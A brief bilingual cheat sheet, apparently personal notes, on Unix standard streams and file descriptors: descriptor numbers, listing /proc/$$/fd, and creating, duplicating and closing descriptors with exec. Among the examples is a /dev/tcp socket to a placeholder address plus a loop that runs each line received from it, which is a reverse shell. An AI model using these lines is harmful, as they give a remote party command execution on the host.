# 标准流

## Standard streams <a href="firstheading" id="firstheading"></a>

in:0  out:1 error:2      redirect:            >&

list all open file descriptors:

```
ls -la /proc/$$/fd
```

\$$: PID of the current running shell.

create file descriptors

```
exec 5<>/dev/tcp/xx.xx.xx.xx/xxxx
```

```
cat <&5 | while read line; do $line 2>&5 >&5; done
```

```
exec 5<&0    创建5作为0的复制
exec 3<&-    删除3
```
